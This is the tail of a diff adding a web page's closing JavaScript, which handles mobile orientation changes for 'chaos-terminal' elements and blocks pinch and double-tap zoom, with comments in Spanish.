+                // Recalcular posiciones si hay terminales activas
+                const activeTerminals = document.querySelectorAll('.chaos-terminal');
+                if (activeTerminals.length > 0) {
+                    console.log('📱 Orientación cambiada, reajustando elementos...');
+                    // Forzar un repaint
+                    document.body.style.display = 'none';
+                    document.body.offsetHeight; // trigger reflow
+                    document.body.style.display = '';
+                }
+            }, 100);
+        });
+
+        // PREVENIR ZOOM EN MÓVILES
+        document.addEventListener('touchstart', function(event) {
+            if (event.touches.length > 1) {
+                event.preventDefault();
+            }
+        }, { passive: false });
+
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(event) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+
+        // El mensaje principal se queda hasta que se haga click en "ACCEDER AL PARAÍSO"
+    </script>
+</body>
+</html>
